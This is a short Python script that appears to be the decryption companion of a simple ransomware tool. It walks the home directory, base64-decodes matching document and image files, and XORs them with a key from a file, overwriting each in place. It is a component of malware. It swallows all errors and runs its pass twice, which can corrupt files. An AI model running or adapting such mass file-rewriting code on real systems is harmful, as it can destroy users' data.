import os
import base64

FILE_EXTS = ["txt", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "pdf", "jpg", "jpeg", "png", "jfif"]
SYSROOT = os.path.expanduser('~')

def decrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        deserialized_data = base64.b64decode(data)
        unencrypted_data = bytearray()
        for i, byte in enumerate(deserialized_data):
            unencrypted_data.append(byte ^ key[i % len(key)])
        with open(file_path, "wb") as file:
            file.write(unencrypted_data)
    except:
        pass


def decrypt_system(key):
        system = os.walk(SYSROOT, topdown=True)
        for root, dirs, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if file.split('.')[-1].lower() in FILE_EXTS:                    
                    decrypt_file(file_path, key)
                   

def main():
    with open("KEY", "rb") as key_file:
        key = key_file.read()
    for i in range(2):
        decrypt_system(key)


if __name__ == "__main__":
    main()
